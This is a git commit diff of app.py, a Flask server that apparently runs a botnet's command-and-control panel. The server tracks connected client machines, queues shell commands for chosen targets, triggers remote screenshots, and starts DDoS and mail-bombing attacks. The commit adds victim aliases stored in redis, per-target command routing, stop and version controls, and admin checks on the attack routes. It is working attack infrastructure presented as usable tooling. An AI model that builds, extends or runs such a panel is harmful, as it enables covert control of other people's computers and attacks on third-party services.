9643f35ad93dc3bf3a9182e1c3b85d71911e6574
@Yxiangzhilv <danny070601@aliyun.com>
2021-05-16 23:11:25 +0800

    Update app.py

--- app.py
+++ app.py
@@ -3,19 +3,28 @@ import json
 import os
 import time
 
+import redis_server
+
+version = 4
+download_address = "download_address"
+
 thisDir = os.path.dirname(os.path.abspath(__file__))
 app = Flask(__name__)
-app.secret_key = "secret_key"
+app.secret_key = "Secretkey"
+redis = redis_server.RedisServer("host", "port", "password")
 connects = {}
 commands = []
 mail_attack = {"set-time": time.time()}
 ddos = {"set-time": time.time()}
 screenshot = 0
+stop = {"once": [], "forever": []}
+show_version = []
+another_name = {}
 
 
 @app.route("/", methods=["POST", "GET"])
 def index():
-    if request.method == "POST" and request.form.get("password") == "password":  # Your login password.
+    if request.method == "POST" and request.form.get("password") == "password":
         session["admin"] = "admin"
     if not session.get("admin"):
         return render_template("login.html")
@@ -25,7 +34,9 @@ def index():
         if time.time() - j <= 15:
             connects_[i] = j
     connects = connects_
-    return render_template("index.html", users=connects)
+    return render_template("index.html", users=connects, another_name=another_name,
+                           version=version, download_address=download_address,
+                           time=time.time, round=round)
 
 
 @app.route("/upload", methods=["POST"])
@@ -40,13 +51,32 @@ def upload():
 def start():
     connects[request.form.get("name")] = time.time()
     print("新的设备（%s）成功连接到服务器" % request.form.get("name"))
-    result = {"action": len(commands)}
+    another_name[request.form.get("name")] = redis.get("site:RUI:computer:%s" % request.form.get("name")) or "(None)"
+    result = {"action": len(commands), "version": version, "download_address": download_address}
     return json.dumps(result)
+
+
+@app.route("/set-another-name", methods=["POST"])
+def set_another_name():
+    name = request.form.get("name").replace("\t", "")
+    redis.set("site:RUI:computer:%s" % name, request.form.get("another_name"))
+    another_name[name] = redis.get("site:RUI:computer:%s" % name) or "(None)"
+    return redirect("/")
 
 
 @app.route("/connect", methods=["POST"])
 def connect():
     result = {"getScreen": connects[request.form.get("name")] < screenshot}
+
+    if request.form.get("name") in show_version:
+        result["show-version"] = True
+        show_version.remove(request.form.get("name"))
+
+    if request.form.get("name") in stop["once"]:
+        result["stop-once"] = True
+        stop["once"].remove(request.form.get("name"))
+    if request.form.get("name") in stop["forever"]:
+        result["stop-forever"] = True
 
     if len(commands) > int(request.form.get("action")):
         result["actions"] = commands[int(request.form.get("action")):]
@@ -73,12 +103,18 @@ def connect():
 
 @app.route("/action", methods=["POST"])
 def sub_action():
-    commands.append(request.form.get("command"))
+    if not session.get("admin"):
+        return redirect("/")
+    commands.append({"command": request.form.get("command"),
+                     "send_to": request.form.get("send_to").replace("\t", "").split(";")
+                     if request.form.get("send_to") else ["all"]})
     return redirect("/")
 
 
 @app.route("/ddos", methods=["POST"])
 def sub_ddos():
+    if not session.get("admin"):
+        return redirect("/")
     global ddos
     ddos = request.form.to_dict().copy()
     ddos["times"] = int(ddos["times"])
@@ -89,6 +125,8 @@ def sub_ddos():
 
 @app.route("/mail-attack", methods=["POST"])
 def sub_mail_attack():
+    if not session.get("admin"):
+        return redirect("/")
     global mail_attack
     mail_attack = request.form.to_dict().copy()
     mail_attack["times"] = int(mail_attack["times"])
@@ -103,9 +141,55 @@ def sub_mail_attack():
 
 @app.route("/screenshot", methods=["POST"])
 def sub_screenshot():
+    if not session.get("admin"):
+        return redirect("/")
     global screenshot
     screenshot = time.time()
     return redirect("/")
+
+
+@app.route("/stop-once", methods=["GET", "POST"])
+def sub_stop_once():
+    if not session.get("admin"):
+        return redirect("/")
+    global stop
+    if request.values.get("name"):
+        for i in request.values.get("name").split(";"):
+            stop["once"].append(i.replace("\t", ""))
+    return redirect("/")
+
+
+@app.route("/stop-forever", methods=["POST"])
+def sub_stop_forever():
+    if not session.get("admin"):
+        return redirect("/")
+    global stop
+    if request.form.get("name"):
+        for i in request.form.get("name").split(";"):
+            stop["forever"].append(i.replace("\t", ""))
+    if request.form.get("reopen"):
+        for i in request.form.get("name").split(";"):
+            try:
+                stop["forever"].remove(i.replace("\t", ""))
+            except:
+                pass
+    return redirect("/")
+
+
+@app.route("/show-version", methods=["GET", "POST"])
+def sub_show_version():
+    if not session.get("admin"):
+        return redirect("/")
+    global show_version
+    if request.values.get("name"):
+        for i in request.values.get("name").split(";"):
+            show_version.append(i.replace("\t", ""))
+    return redirect("/")
+
+
+@app.route("/check-network", methods=["GET", "POST"])
+def check_network():
+    return "Success"
 
 
 if __name__ == "__main__":
